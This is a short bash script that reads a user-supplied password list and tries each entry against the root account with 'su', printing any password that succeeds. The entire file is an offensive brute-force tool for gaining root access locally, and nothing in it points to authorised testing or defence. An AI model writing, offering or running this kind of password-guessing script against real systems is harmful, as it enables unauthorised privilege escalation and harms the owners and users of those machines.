#!/bin/bash

# Define the file containing the list of passwords
read -p "Enter the path to the password file: " password_file

# Check if the password file exists
if [ ! -f "$password_file" ]; then
    echo "Password file not found: $password_file" 1>&2
    exit 1
fi

# Loop through each password in the file
while IFS= read -r password; do
    echo "Attempting password: $password"
    
    # Attempt to switch to root using 'su' command with the current password
    if su -c "echo 'Testing su access' && exit" <<< "$password" >/dev/null 2>&1; then
        echo "Password found: $password"
        exit 0  # Exit script if password is found
    fi
done < "$password_file"

# If the script reaches this point, no valid password was found
echo "No valid password found in $password_file"
exit 1
